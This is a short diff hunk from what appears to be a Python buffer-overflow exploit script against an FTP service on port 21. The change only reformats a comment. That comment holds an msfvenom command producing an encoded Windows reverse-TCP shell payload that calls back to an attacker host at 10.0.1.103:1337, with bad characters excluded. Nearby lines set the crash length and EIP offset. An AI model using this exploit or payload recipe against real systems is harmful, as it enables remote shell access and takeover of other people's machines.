@@ -27,9 +27,10 @@ except IndexError:
     print("Usage: python %s 10.0.1.114 21" % sys.argv[0])
     sys.exit(0)
 
-#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -f python -e x86/shikata_ga_nai 
-#-b "\x00\x0a\x0d" EXECFUNC=thread        #(351 bytes)
-
+#---------------------------------------------------------------------------------------------------------#
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -f python -e x86/shikata_ga_nai       #
+# -b "\x00\x0a\x0d" EXECFUNC=thread        #(351 bytes)                                                   #
+#---------------------------------------------------------------------------------------------------------#
 crash = 3000
 offset = 2006
 
